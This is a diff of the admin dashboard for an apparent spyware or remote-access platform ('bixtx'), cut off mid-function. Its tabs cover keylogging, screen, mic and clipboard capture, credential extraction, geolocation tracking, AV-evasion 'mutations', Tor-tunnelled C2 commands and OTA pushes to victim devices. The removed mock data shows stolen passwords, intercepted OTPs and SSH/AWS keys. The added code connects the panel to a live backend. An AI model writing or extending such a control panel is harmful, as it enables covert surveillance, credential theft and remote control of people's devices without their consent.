@@ -17,10 +17,10 @@ import {
 
 import {
   OS, DeviceStatus, DeployStatus, DeployJob, NetworkIface,
-  DashDevice, DashSession, AppUser, WifiNet,
+  DashDevice, DashSession, WifiNet,
   MOCK_DEPLOY_JOBS, MOCK_NET_IFACES, ALERTS,
   OS_COLOR, OS_ICON, OS_LABEL,
-  SEED_DEVICES, SEED_SESSIONS, SEED_USERS, SEED_WIFI,
+  SEED_DEVICES, SEED_SESSIONS, SEED_WIFI,
   ALERT_COLOR, HEALTH_COLOR, ROLE_COLOR,
   Chip, GlowDot, MiniBar, StatCard, ToastStack, useToast,
   Modal, FLabel, FInput, FSelect, ActionBtn,
@@ -28,6 +28,18 @@ import {
 } from "../shared";
 
 // ─── Admin Dashboard ──────────────────────────────────────────────────────────
+const API_BASE = window.location.hostname === "localhost" ? "http://localhost:3000/v1" : "https://bixtx.onrender.com/v1";
+
+async function apiCall(endpoint: string, method = "GET", body?: object) {
+  const token = sessionStorage.getItem("token") || "";
+  const res = await fetch(`${API_BASE}${endpoint}`, {
+    method,
+    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
+    ...(body ? { body: JSON.stringify(body) } : {}),
+  });
+  return res.json();
+}
+
 export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => void }) {
   const { show, toasts } = useToast();
 
@@ -35,7 +47,6 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
   const [tab, setTab]         = useState<"devices"|"sessions"|"network"|"surveillance"|"location"|"extraction"|"ai"|"c2"|"users"|"alerts"|"deploy">("devices");
   const [devices, setDevices] = useState<DashDevice[]>(SEED_DEVICES);
   const [sessions, setSessions] = useState<DashSession[]>(SEED_SESSIONS);
-  const [users, setUsers]     = useState<AppUser[]>(SEED_USERS);
   const [alerts, setAlerts]   = useState(ALERTS.map(a => ({ ...a, dismissed:false })));
   const [wifi]                = useState<WifiNet[]>(SEED_WIFI);
 
@@ -45,264 +56,41 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
   const [aiLearningPhase, setAiLearningPhase] = useState<"idle"|"scanning"|"learning"|"mutating"|"complete">("idle");
   const [aiProgress, setAiProgress] = useState(0);
   const [aiLearningMode, setAiLearningMode] = useState(true);
-  const [aiMutations, setAiMutations] = useState<{id:string;type:string;target:string;confidence:number;applied:boolean;ignored?:boolean;ts:string}[]>([
-    {id:"m1",type:"Stealth Enhancement",  target:"KIOSK-UBUNTU-07", confidence:97, applied:true,  ts:"14:20:00"},
-    {id:"m2",type:"AV Evasion Retrain",   target:"EXEC-LAPTOP-01",  confidence:94, applied:true,  ts:"14:15:00"},
-    {id:"m3",type:"Network Fingerprint",  target:"MacBook-Pro-M3",   confidence:88, applied:false, ts:"14:32:00"},
-    {id:"m4",type:"Kernel Hook Adapt",    target:"DEVBOX-ARCH",      confidence:92, applied:true,  ts:"13:55:00"},
-  ]);
-  const [targetProfiles, setTargetProfiles] = useState([
-    {id:"t1",name:"j.morgan",   dev:"EXEC-LAPTOP-01",  behavior:"Office hours 08-18, frequent Excel usage",  risk:62,  learned:true,  anomalyCount:3},
-    {id:"t2",name:"s.chen",     dev:"MacBook-Pro-M3",   behavior:"Developer — heavy terminal, git commits",  risk:45,  learned:true,  anomalyCount:1},
-    {id:"t3",name:"k.ivanov",   dev:"DEVBOX-ARCH",      behavior:"Night owl — active 22-06, VPN always on",  risk:91,  learned:true,  anomalyCount:7},
-    {id:"t4",name:"r.okafor",   dev:"Galaxy-S24-Ultra", behavior:"High mobility, frequent unknown contacts",  risk:78,  learned:true,  anomalyCount:5},
-    {id:"t5",name:"a.patel",    dev:"iPhone-15-Pro",    behavior:"Regular commute pattern, social media heavy",risk:34, learned:false, anomalyCount:0},
-  ]);
+  const [aiMutations, setAiMutations] = useState<{id:string;type:string;target:string;confidence:number;applied:boolean;ignored?:boolean;ts:string}[]>([]);
+  const [targetProfiles, setTargetProfiles] = useState<{id:string;name:string;dev:string;behavior:string;risk:number;learned:boolean;anomalyCount:number}[]>([]);
   const [klEnabled,  setKlEnabled]  = useState(true);
   const [srEnabled,  setSrEnabled]  = useState(true);
   const [camEnabled, setCamEnabled] = useState(false);
   const [micEnabled, setMicEnabled] = useState(true);
   const [clipEnabled,setClipEnabled]= useState(true);
-  const [klLogs] = useState([
-    { ts:"14:32:11", dev:"EXEC-LAPTOP-01",  app:"Chrome",    text:"meeting notes for project bixtx" },
-    { ts:"14:31:58", dev:"MacBook-Pro-M3",   app:"Terminal",  text:"git commit -m 'fix auth'" },
-    { ts:"14:31:44", dev:"KIOSK-UBUNTU-07", app:"Nano",      text:"sudo nano /etc/hosts" },
-    { ts:"14:31:30", dev:"EXEC-LAPTOP-01",  app:"Slack",     text:"can you send me the report" },
-    { ts:"14:31:15", dev:"DEVBOX-ARCH",     app:"Vim",       text:":wq /etc/ssh/sshd_config" },
-    { ts:"14:30:59", dev:"MacBook-Pro-M3",   app:"Chrome",    text:"https://github.com/bixtx" },
-  ]);
-  const [clipLogs] = useState([
-    { ts:"14:32:05", dev:"EXEC-LAPTOP-01",  content:"Meeting at 3pm - conf room B",     app:"Outlook" },
-    { ts:"14:31:42", dev:"MacBook-Pro-M3",   content:"sk-ant-api03-xxxxxxxxxxxx",         app:"Terminal" },
-    { ts:"14:31:08", dev:"KIOSK-UBUNTU-07", content:"192.168.1.1:8080/admin",            app:"Firefox" },
-  ]);
-  const [recordings] = useState([
-    { id:"r1", dev:"EXEC-LAPTOP-01",  start:"14:00:00", dur:"32m 11s", size:"1.2 GB", status:"recording" },
-    { id:"r2", dev:"MacBook-Pro-M3",   start:"13:45:00", dur:"47m 05s", size:"2.1 GB", status:"recording" },
-    { id:"r3", dev:"DEVBOX-ARCH",     start:"12:00:00", dur:"2h 32m",  size:"5.8 GB", status:"saved"     },
-  ]);
+  const [klLogs] = useState<{ts:string;dev:string;app:string;text:string}[]>([]);
+  const [clipLogs] = useState<{ts:string;dev:string;content:string;app:string}[]>([]);
+  const [recordings] = useState<{id:string;dev:string;start:string;dur:string;size:string;status:string}[]>([]);
 
   // ── location state ──
-  const [geoDevices] = useState([
-    { id:"d1", name:"EXEC-LAPTOP-01",  lat:40.7128,   lng:-74.0060,  loc:"New York, US",    acc:"3m",   spd:"0 km/h",   upd:"Now"    },
-    { id:"d2", name:"MacBook-Pro-M3",   lat:1.3521,    lng:103.8198, loc:"Singapore",       acc:"5m",   spd:"0 km/h",   upd:"Now"    },
-    { id:"d4", name:"Galaxy-S24-Ultra", lat:6.5244,    lng:3.3792,   loc:"Lagos, NG",       acc:"8m",   spd:"42 km/h",  upd:"2m ago" },
-    { id:"d5", name:"iPhone-15-Pro",    lat:19.0760,   lng:72.8777,  loc:"Mumbai, IN",      acc:"4m",   spd:"0 km/h",   upd:"Now"    },
-    { id:"d6", name:"Mate60-Pro",       lat:31.2304,   lng:121.4737, loc:"Shanghai, CN",    acc:"6m",   spd:"0 km/h",   upd:"Now"    },
-  ]);
-  const [geofences, setGeofences] = useState([
-    { id:"g1", name:"HQ Campus",       lat:40.7128,  lng:-74.006,  radius:"500m",  active:true,  breached:false },
-    { id:"g2", name:"Singapore Office",lat:1.3521,   lng:103.8198, radius:"300m",  active:true,  breached:false },
-    { id:"g3", name:"Restricted Zone", lat:31.2304,  lng:121.4737, radius:"1 km",  active:true,  breached:false },
-  ]);
+  const [geoDevices] = useState<{id:string;name:string;lat:number;lng:number;loc:string;acc:string;spd:string;upd:string}[]>([]);
+  const [geofences, setGeofences] = useState<{id:string;name:string;lat:number;lng:number;radius:string;active:boolean;breached:boolean}[]>([]);
 
   // ── extraction state ──
   const [viewJobId, setViewJobId] = useState<string|null>(null);
   const [viewQuickType, setViewQuickType] = useState<string|null>(null);
-  const [quickExtractDev, setQuickExtractDev] = useState("iPhone-15-Pro");
+  const [quickExtractDev, setQuickExtractDev] = useState("");
 
-  // ── per-device sample data for extraction preview ──
-  const DEVICE_EXTRACT_DATA: Record<string,Record<string,{cols:string[];rows:string[][]}>> = {
-    "EXEC-LAPTOP-01": {
-      "Browser History": { cols:["URL","Title","Visited","Duration"], rows:[
-        ["https://sharepoint.corp.io/finance","Finance Q2 — SharePoint","14:31:02","8m 12s"],
-        ["https://outlook.office365.com","Outlook — Inbox","14:28:55","22m 04s"],
-        ["https://bankofamerica.com/wires","B of A Wire Transfer","13:58:44","6m 07s"],
-        ["https://vpn.corp.io/login","Corp VPN Portal","14:18:03","1m 22s"],
-        ["https://confluence.corp.io/board","Board Reports","14:10:11","4m 39s"],
-      ]},
-      "Contacts":{ cols:["Name","Phone","Email","Title"], rows:[
-        ["Sarah Mitchell","+1-555-0101","s.mitchell@corp.io","CFO"],
-        ["David Kim","+1-555-0188","d.kim@corp.io","VP Engineering"],
-        ["Rachel Torres","+1-555-0177","r.torres@law.io","General Counsel"],
-      ]},
-      "Credentials":{ cols:["Site","Username","Password","Source","Captured"], rows:[
-        ["vpn.corp.io","j.morgan@corp.io","C0rpVPN#2026!","AutoFill","14:18:03"],
-        ["outlook.office365.com","j.morgan","M365P@ss!","Keylogger","14:10:00"],
-        ["bankofamerica.com","jamesmorgan26","Financi@l99","AutoFill","13:58:44"],
-        ["aws.amazon.com","j.morgan+aws","AWSr00t!Corp","Keylogger","13:45:00"],
-      ]},
-      "SMS & Calls":{ cols:["Type","Contact","Preview / Duration","Time"], rows:[
-        ["SMS","Sarah Mitchell","Q3 numbers look good","14:32:00"],
-        ["Call","Rachel Torres","18m 22s","13:10:00"],
-      ]},
-      "File System":{ cols:["Path","Size","Modified","Type"], rows:[
-        ["C:\\Users\\jmorgan\\Documents\\Board_Q3.xlsx","2.4 MB","14:20:11","Excel"],
-        ["C:\\Users\\jmorgan\\Downloads\\NDA_draft.pdf","890 KB","13:55:00","PDF"],
-        ["C:\\Users\\jmorgan\\Desktop\\wire_confirm.pdf","320 KB","13:58:55","PDF"],
-        ["C:\\secrets\\aws_keys.txt","1.2 KB","12:00:00","Text"],
-      ]},
-      "Media Vault":{ cols:["Filename","Size","Captured","Type"], rows:[
-        ["screenshot_2026-07-01_14-31.jpg","1.2 MB","14:31:00","Screen"],
-        ["screen_bankportal.jpg","980 KB","13:58:44","Screen"],
-      ]},
-    },
-    "MacBook-Pro-M3": {
-      "Browser History":{ cols:["URL","Title","Visited","Duration"], rows:[
-        ["https://github.com/bixtx/backend","bixtx/backend — GitHub","14:30:01","12m 44s"],
-        ["https://linear.app/bixtx/issues","Linear — Sprint Board","14:22:33","8m 10s"],
-        ["https://figma.com/files","Figma — Design System","14:15:00","5m 22s"],
-        ["https://notion.so/bixtx/roadmap","Product Roadmap — Notion","14:08:12","3m 55s"],
-      ]},
-      "Contacts":{ cols:["Name","Phone","Email","Last Seen"], rows:[
-        ["James Morgan","+1-555-0142","j.morgan@corp.io","Today 09:12"],
-        ["Raj Patel","+91-98000-11222","raj@startup.in","Yesterday"],
-        ["Lei Wei","+86-138-0000-0001","lei.wei@techco.cn","2 days ago"],
-        ["Kwame Osei","+233-24-456789","k.osei@corp.io","Today 11:45"],
-      ]},
-      "Credentials":{ cols:["Site","Username","Password","Source","Captured"], rows:[
-        ["github.com","s.chen","gh_token_xK9mP2qR","AutoFill","14:30:01"],
-        ["notion.so","s.chen@dev.io","N0tion#2026!","Keylogger","14:08:12"],
-        ["figma.com","s.chen@dev.io","Figm@Pass!1","AutoFill","14:15:00"],
-      ]},
-      "File System":{ cols:["Path","Size","Modified","Type"], rows:[
-        ["/Users/schen/Projects/backend/.env","1.8 KB","14:29:00","Env"],
-        ["/Users/schen/Documents/API_keys.txt","4 KB","13:00:00","Text"],
-        ["/Users/schen/Downloads/contract.pdf","2.1 MB","12:30:00","PDF"],
-      ]},
-      "SMS & Calls":{ cols:["Type","Contact","Preview / Duration","Time"], rows:[
-        ["iMessage","Raj Patel","Can you push the hotfix?","14:25:00"],
-        ["Call","James Morgan","9m 05s","13:40:00"],
-      ]},
-      "Media Vault":{ cols:["Filename","Size","Captured","Type"], rows:[
-        ["cam_14-22-33.jpg","3.2 MB","14:22:33","Camera — Front"],
-        ["screen_linear.jpg","1.1 MB","14:22:00","Screen"],
-      ]},
-    },
-    "iPhone-15-Pro": {
-      "Browser History":{ cols:["URL","Title","Visited","Duration"], rows:[
-        ["https://instagram.com/explore","Instagram Explore","14:29:01","18m"],
-        ["https://maps.apple.com/?q=airport","Apple Maps — Airport","14:10:44","5m"],
-        ["https://chase.com/online","Chase Mobile Banking","13:55:00","12m"],
-        ["https://apple.com/icloud","iCloud — Storage","13:30:00","3m"],
-      ]},
-      "Contacts":{ cols:["Name","Phone","iCloud","Last Contact"], rows:[
-        ["Mom","+91-99100-00001","mom@icloud.com","Today 08:05"],
-        ["Priya Sharma","+91-98765-43210","priya@gmail.com","Yesterday 21:30"],
-        ["Chase Bank","+1-800-935-9935","—","2 days ago"],
-        ["Dr. Gupta","+91-22-4000-5000","—","Last week"],
-      ]},
-      "Credentials":{ cols:["Service","Account","Password / Token","Source","Captured"], rows:[
-        ["iCloud","a.patel@icloud.com","iCl0ud#2026!","Keychain Hook","14:30:00"],
-        ["WhatsApp","+91-98000-11222","OTP: 847291","SMS Intercept","14:21:33"],
-        ["Instagram","@patel_a_dev","Insta@2026","Keylogger","13:58:00"],
-        ["Chase Bank","raj.patel@mail.com","Bank$afe2026","Keylogger","13:55:00"],
-      ]},
-      "SMS & Calls":{ cols:["Type","Contact","Preview / Duration","Time"], rows:[
-        ["iMessage","Mom","On my way home","14:29:01"],
-        ["SMS","Chase Bank","Your OTP is 847291","14:21:33"],
-        ["Call","Priya Sharma","4m 12s","13:44:22"],
-        ["iMessage","Unknown","Click here to confirm","13:00:00"],
-      ]},
-      "Media Vault":{ cols:["Filename","Size","Captured","Type"], rows:[
-        ["IMG_4821.heic","4.8 MB","14:28:00","Camera — Rear"],
-        ["IMG_4820.heic","3.9 MB","14:27:44","Camera — Front (Selfie)"],
-        ["VID_1033.mov","88 MB","13:45:00","Video — Rear"],
-        ["screen_chase.png","1.1 MB","13:55:00","Screenshot"],
-      ]},
-      "File System":{ cols:["Path","Size","Modified","Type"], rows:[
-        ["/var/mobile/Documents/passport_scan.pdf","3.1 MB","2026-06-01","PDF"],
-        ["/var/mobile/Downloads/bank_statement.pdf","980 KB","2026-07-01","PDF"],
-        ["iCloud/Photos/2026-07","—","Syncing","iCloud Album"],
-      ]},
-    },
-    "Galaxy-S24-Ultra": {
-      "SMS & Calls":{ cols:["Type","Contact","Preview / Duration","Time"], rows:[
-        ["WhatsApp","Team Lead","Meeting pushed to 5pm","14:29:01"],
-        ["SMS","+234-801-234-5678","Your transfer of ₦500k is confirmed","14:21:33"],
-        ["Call","Unknown +44","1m 02s","13:44:22"],
-        ["SMS","Bank Alert","New login from Lagos","13:00:00"],
-      ]},
-      "Contacts":{ cols:["Name","Phone","WhatsApp","Source"], rows:[
-        ["Chidi Okafor","+234-802-111-2222","✓","Phonebook"],
-        ["Emeka Ltd","+234-701-333-4444","✓","Phonebook"],
-        ["Dr. Afolabi","+234-818-555-6666","—","Phonebook"],
-        ["Unknown UK","+44-7700-900142","✓","Recent Call"],
-      ]},
-      "Credentials":{ cols:["App","Username","Password / Token","Source","Captured"], rows:[
-        ["GTBank App","r.okafor@mail.ng","GTB@2026!","Keylogger","14:22:00"],
-        ["WhatsApp","+234-802-111-2222","Session token","Memory Hook","14:10:00"],
-        ["Gmail","r.okafor@gmail.com","Gm@il#2026","AutoFill","13:55:00"],
-      ]},
-      "Media Vault":{ cols:["Filename","Size","Captured","Type"], rows:[
-        ["DCIM_20260701_1422.jpg","5.2 MB","14:22:00","Camera — Rear"],
-        ["WhatsApp_video_001.mp4","22 MB","13:30:00","WhatsApp Video"],
-      ]},
-      "Browser History":{ cols:["URL","Title","Visited","Duration"], rows:[
-        ["https://gtbank.com/transfer","GTBank — Transfer","14:18:00","8m"],
-        ["https://wa.me","WhatsApp Web","14:05:00","22m"],
-        ["https://jumia.com.ng","Jumia Nigeria","13:30:00","15m"],
-      ]},
-      "File System":{ cols:["Path","Size","Modified","Type"], rows:[
-        ["/sdcard/Download/bank_slip.pdf","320 KB","14:18:00","PDF"],
-        ["/sdcard/DCIM/Camera/","—","Ongoing","Images"],
-        ["/data/data/com.whatsapp/databases/","—","14:29:00","WhatsApp DB"],
-      ]},
-    },
-    "DEVBOX-ARCH": {
-      "Credentials":{ cols:["Site/Key","Username","Value","Source","Captured"], rows:[
-        ["github.com","k.ivanov","ghp_xK9mP2qR...","~/.gitconfig","13:55:00"],
-        ["aws cli","k.ivanov","AKIA...7X2Q","~/.aws/credentials","13:50:00"],
-        ["SSH Key","k.ivanov","RSA 4096 — id_rsa","~/.ssh/","13:48:00"],
-        ["slack.com","k.ivanov@corp.io","Sl@ck!2026","Browser AutoFill","09:00:00"],
-        ["VPN","k.ivanov","vpnP@ss2026","Keylogger","08:30:00"],
-      ]},
-      "Browser History":{ cols:["URL","Title","Visited","Duration"], rows:[
-        ["https://github.com/bixtx/agent","Agent Repo — GitHub","14:30:00","45m"],
-        ["https://shodan.io/search?query=bixtx","Shodan — bixtx","22:03:00","12m"],
-        ["https://hackforums.net/showthread","HF Thread #98712","22:45:00","8m"],
-      ]},
-      "File System":{ cols:["Path","Size","Modified","Type"], rows:[
-        ["/home/kivanov/.ssh/id_rsa","3.2 KB","2026-06-01","SSH Private Key"],
-        ["/home/kivanov/.aws/credentials","900 B","13:50:00","AWS Creds"],
-        ["/home/kivanov/tools/exploit.py","18 KB","22:03:00","Python Script"],
-        ["/home/kivanov/Documents/secret_plan.txt","4.1 KB","21:55:00","Text"],
-      ]},
-      "SMS & Calls":{ cols:["Type","Contact","Preview","Time"], rows:[
-        ["Signal","Unknown","Shipment confirmed","22:10:00"],
-      ]},
-      "Contacts":{ cols:["Name","Handle","Platform","Note"], rows:[
-        ["[REDACTED]","@zero_day_m","Telegram","Frequent"],
-        ["Backup","+1-555-0199","SMS","Emergency"],
-      ]},
-      "Media Vault":{ cols:["Filename","Size","Modified","Type"], rows:[
-        ["screen_22-03.png","2.1 MB","22:03:00","Screen Capture"],
-        ["keylog_dump_2026-07-01.txt","880 KB","22:00:00","Keylog Export"],
-      ]},
-    },
-  };
-  const [extractJobs, setExtractJobs] = useState([
-    { id:"e1", dev:"EXEC-LAPTOP-01",  type:"Browser History", status:"complete", size:"4.2 MB",  items:1842, ts:"14:20:00" },
-    { id:"e2", dev:"MacBook-Pro-M3",   type:"Contacts",        status:"complete", size:"128 KB",  items:312,  ts:"14:18:00" },
-    { id:"e3", dev:"Galaxy-S24-Ultra", type:"SMS Log",          status:"running",  size:"—",       items:0,    ts:"14:32:00" },
-    { id:"e4", dev:"iPhone-15-Pro",    type:"Media Vault",      status:"queued",   size:"—",       items:0,    ts:"—"        },
-    { id:"e5", dev:"DEVBOX-ARCH",     type:"Credentials",      status:"complete", size:"18 KB",   items:27,   ts:"13:55:00" },
-  ]);
-  const [credentials] = useState([
-    { site:"github.com",       user:"k.ivanov",    pass:"••••••••",  dev:"DEVBOX-ARCH",      ts:"13:55:00" },
-    { site:"aws.amazon.com",   user:"j.morgan",    pass:"••••••••",  dev:"EXEC-LAPTOP-01",   ts:"14:20:00" },
-    { site:"notion.so",        user:"s.chen",      pass:"••••••••",  dev:"MacBook-Pro-M3",    ts:"14:18:00" },
-    { site:"slack.com",        user:"t.brooks",    pass:"••••••••",  dev:"WORKSTATION-WIN11", ts:"09:00:00" },
-  ]);
+  // ── per-device data for extraction preview (populated from real device API) ──
+  const DEVICE_EXTRACT_DATA: Record<string,Record<string,{cols:string[];rows:string[][]}>> = {};
+
+  const [extractJobs, setExtractJobs] = useState<{id:string;dev:string;type:string;status:string;size:string;items:number;ts:string}[]>([]);
+  const [credentials] = useState<{site:string;user:string;pass:string;dev:string;ts:string}[]>([]);
 
   // ── AI engine state ──
-  const [anomalies] = useState([
-    { id:"a1", dev:"KIOSK-UBUNTU-07", type:"CPU Spike",         risk:"high",   conf:"94%",  det:"14:31:00", desc:"Sustained 78% CPU — potential crypto miner" },
-    { id:"a2", dev:"Galaxy-S24-Ultra",type:"Location Jump",     risk:"medium", conf:"87%",  det:"14:28:00", desc:"Device moved 12km in 3 minutes" },
-    { id:"a3", dev:"EXEC-LAPTOP-01",  type:"Credential Access", risk:"high",   conf:"91%",  det:"14:20:00", desc:"Mass credential lookup at 02:00 local time" },
-    { id:"a4", dev:"MacBook-Pro-M3",   type:"Network Exfil",    risk:"critical",conf:"98%", det:"14:15:00", desc:"3.4 GB outbound to unknown IP 185.x.x.x" },
-  ]);
+  const [anomalies] = useState<{id:string;dev:string;type:string;risk:string;conf:string;det:string;desc:string}[]>([]);
   const [playbooks, setPlaybooks] = useState([
     { id:"p1", name:"Auto-Lock on Threat",      trigger:"critical anomaly",  action:"Lock device + alert admin",         active:true  },
     { id:"p2", name:"Geofence Breach Response", trigger:"geofence exit",     action:"Enable GPS ping every 30s",         active:true  },
     { id:"p3", name:"Exfil Shutdown",           trigger:"large upload >1GB", action:"Block outbound + capture traffic",  active:false },
     { id:"p4", name:"Offline Escalation",       trigger:"device offline 1h", action:"Send SMS alert + enable offline rec",active:true },
   ]);
-  const [faceEvents] = useState([
-    { ts:"14:30:00", dev:"iPhone-15-Pro",    match:"Known — Raj Patel",    conf:"97%", action:"Unlocked" },
-    { ts:"14:28:00", dev:"Galaxy-S24-Ultra", match:"Unknown face",          conf:"—",   action:"Alert sent" },
-    { ts:"14:15:00", dev:"Mate60-Pro",       match:"Known — Lei Wei",       conf:"99%", action:"Unlocked" },
-  ]);
+  const [faceEvents] = useState<{ts:string;dev:string;match:string;conf:string;action:string}[]>([]);
 
   // ── traffic obfuscation state ──
   const [obfuscation, setObfuscation] = useState([
@@ -315,14 +103,10 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
   ]);
 
   // ── C2 state ──
-  const [c2Status] = useState({ tunnel:"Tor", hops:3, latency:"340ms", encrypted:true, active:true });
-  const [cmdQueue, setCmdQueue] = useState([
-    { id:"c1", dev:"EXEC-LAPTOP-01",  cmd:"screenshot",          status:"pending",  ts:"14:32:00" },
-    { id:"c2", dev:"KIOSK-UBUNTU-07", cmd:"keylog --dump 100",   status:"running",  ts:"14:31:50" },
-    { id:"c3", dev:"MacBook-Pro-M3",   cmd:"file-pull /etc/hosts",status:"complete", ts:"14:31:00" },
-  ]);
+  const [c2Status] = useState({ tunnel:"—", hops:0, latency:"—", encrypted:true, active:false });
+  const [cmdQueue, setCmdQueue] = useState<{id:string;dev:string;cmd:string;status:string;ts:string}[]>([]);
   const [newCmd, setNewCmd] = useState("");
-  const [newCmdDev, setNewCmdDev] = useState("EXEC-LAPTOP-01");
+  const [newCmdDev, setNewCmdDev] = useState("");
 
   // ── deploy state ──
   const [deployJobs, setDeployJobs]         = useState<DeployJob[]>(MOCK_DEPLOY_JOBS);
@@ -338,18 +122,22 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
   const [netIfaces]                         = useState<NetworkIface[]>(MOCK_NET_IFACES);
   const [netFilter, setNetFilter]           = useState<NetworkIface["type"]|"all">("all");
 
+  // archived devices
+  const [archivedDevices, setArchivedDevices] = useState<DashDevice[]>([]);
+  const [showArchive, setShowArchive]         = useState(false);
+
   // device filters
   const [search, setSearch]           = useState("");
-  const [fStatus, setFStatus]         = useState<DeviceStatus|"all">("all");
+  const [fStatus, setFStatus]         = useState<DeviceStatus|"all"|"suspended">("all");
   const [fType, setFType]             = useState<"all"|"desktop"|"mobile">("all");
   const [fCountry, setFCountry]       = useState<string>("all");
+  const [fSoftwareA, setFSoftwareA]   = useState<"all"|"active"|"inactive"|"none">("all");
   const [viewMode, setViewMode]       = useState<"grid"|"list">("grid");
 
   // modals
   const [showAdd,     setShowAdd]     = useState(false);
   const [showManage,  setShowManage]  = useState(false);
   const [showByIP,    setShowByIP]    = useState(false);
-  const [showAddUser, setShowAddUser] = useState(false);
   const [showQR,      setShowQR]      = useState(false);
 
   // ── security policy toggles ──
@@ -379,10 +167,6 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
   const [mIP,     setMIP]     = useState("");
   const [mHealth, setMHealth] = useState<"excellent"|"good"|"warning">("good");
 
-  // add-user form
-  const [uName,  setUName]  = useState("");
-  const [uEmail, setUEmail] = useState("");
-  const [uRole,  setURole]  = useState<AppUser["role"]>("viewer");
 
   // connect-by-IP form
   const [bName, setBName] = useState("");
@@ -391,17 +175,6 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
   const [bUser, setBUser] = useState("");
   const [bPass, setBPass] = useState("");
 
-  // live metric ticker
-  useEffect(() => {
-    const iv = setInterval(() => {
-      setDevices(prev => prev.map(d => d.status === "offline" ? d : {
-        ...d,
-        cpu: Math.min(99, Math.max(1, d.cpu + Math.floor(Math.random()*7)-3)),
-        ram: Math.min(99, Math.max(10, d.ram + Math.floor(Math.random()*5)-2)),
-      }));
-    }, 4000);
-    return () => clearInterval(iv);
-  }, []);
 
   // ── real-time admin WebSocket feed ────────────────────────────────────────
   useEffect(() => {
@@ -475,7 +248,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
 
     // Retrieve the session token stored at login — never hardcode credentials here.
     // sessionStorage is cleared when the tab closes; localStorage would persist across tabs.
-    const storedToken = sessionStorage.getItem("admin_token");
+    const storedToken = sessionStorage.getItem("token");
     if (storedToken) {
       connect(storedToken);
     } else {
@@ -489,7 +262,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
         .then(r => r.ok ? r.json() : null)
         .then(data => {
           if (data?.token) {
-            sessionStorage.setItem("admin_token", data.token);
+            sessionStorage.setItem("token", data.token);
             connect(data.token);
           }
         })
@@ -530,6 +303,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
     return (fStatus==="all"  || d.status===fStatus)
         && (fType==="all"    || d.type===fType)
         && (fCountry==="all" || country===fCountry)
+        && (fSoftwareA==="all" || (d.softwareA ?? "none")===fSoftwareA)
         && (!q || d.name.toLowerCase().includes(q)
                || d.user.toLowerCase().includes(q)
                || d.ip.includes(q)
@@ -577,8 +351,35 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
 
   const handleRemoveDev = () => {
     if (!manageDev) return;
+    setArchivedDevices(p => [...p, { ...manageDev, status: "offline" }]);
     setDevices(p => p.filter(d => d.id!==manageDev.id));
-    show(`Device removed`, "info"); setShowManage(false);
+    show(`Device archived`, "info"); setShowManage(false);
+  };
+
+  const handleSuspendDev = (id: string) => {
+    setDevices(p => p.map(d => d.id===id ? { ...d, status: "suspended" as DeviceStatus } : d));
+    show("Device suspended", "info");
+  };
+
+  const handleUnsuspendDev = (id: string) => {
+    setDevices(p => p.map(d => d.id===id ? { ...d, status: "offline" } : d));
+    show("Device reactivated");
+  };
+
+  const handleArchiveDev = (id: string) => {
+    const dev = devices.find(d => d.id===id);
+    if (!dev) return;
+    setArchivedDevices(p => [...p, { ...dev, status: "offline" }]);
+    setDevices(p => p.filter(d => d.id!==id));
+    show("Device moved to archive", "info");
+  };
+
+  const handleRestoreArchived = (id: string) => {
+    const dev = archivedDevices.find(d => d.id===id);
+    if (!dev) return;
+    setDevices(p => [...p, dev]);
+    setArchivedDevices(p => p.filter(d => d.id!==id));
+    show("Device restored");
   };
 
   const handleByIP = () => {
@@ -597,25 +398,11 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
     setBName(""); setBIP(""); setBPort("4433"); setBUser(""); setBPass("");
   };
 
-  const handleAddUser = () => {
-    if (!uName || !uEmail) { show("Enter name and email", "error"); return; }
-    setUsers(p => [...p, { id:`u${Date.now()}`, name:uName, email:uEmail, role:uRole, status:"active", lastLogin:"Never", devices:0 }]);
-    show(`User "${uName}" added`); setShowAddUser(false); setUName(""); setUEmail(""); setURole("viewer");
-  };
 
   const handleEndSession   = (id: string) => { setSessions(p => p.filter(s => s.id!==id)); show("Session ended","info"); };
   const handleToggleSess   = (id: string) => {
     setSessions(p => p.map(s => s.id===id ? {...s, status: s.status==="active"?"paused":"active"} : s));
     show("Session updated");
-  };
-  const handleToggleUser   = (id: string) => {
-    setUsers(p => p.map(u => u.id===id ? {...u, status: u.status==="active"?"inactive":"active"} : u));
-    show("User status updated");
-  };
-  const handleRemoveUser   = (id: string) => {
-    const u = users.find(x => x.id===id);
-    setUsers(p => p.filter(x => x.id!==id));
-    show(`"${u?.name}" removed`, "info");
   };
   const handleCopy = () => {
     navigator.clipboard.writeText(code).catch(()=>{});
@@ -627,12 +414,44 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
   const handleOTA = () => {
     if (otaPct !== null) return;
     setOtaPct(0);
-    const iv = setInterval(() => {
-      setOtaPct(p => {
-        if (p===null || p>=100) { clearInterval(iv); show(`OTA pushed to ${online} devices`); setOtaPct(null); return null; }
-        return Math.min(p + 10, 100);
-      });
-    }, 180);
+    apiCall("/update/push", "POST", { version: "4.7.2" })
+      .then(res => {
+        setOtaPct(100);
+        setTimeout(() => { setOtaPct(null); show(`OTA pushed to ${res.success ?? 0} device(s)`); }, 600);
+      })
+      .catch(() => { setOtaPct(null); show("OTA push failed — no devices online", "error"); });
+  };
+
+  const handleExportAudit = () => {
+    const rows = [["Time","Device","Action","User"]];
+    const csv = rows.map(r => r.join(",")).join("\n");
+    const blob = new Blob([csv], { type:"text/csv" });
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = `bixtx-audit-${new Date().toISOString().slice(0,10)}.csv`;
+    a.click();
+    show("Audit log exported");
+  };
+
+  const handleHealthScan = () => {
+    apiCall("/stats")
+      .then(() => show("Health scan complete — all systems reachable"))
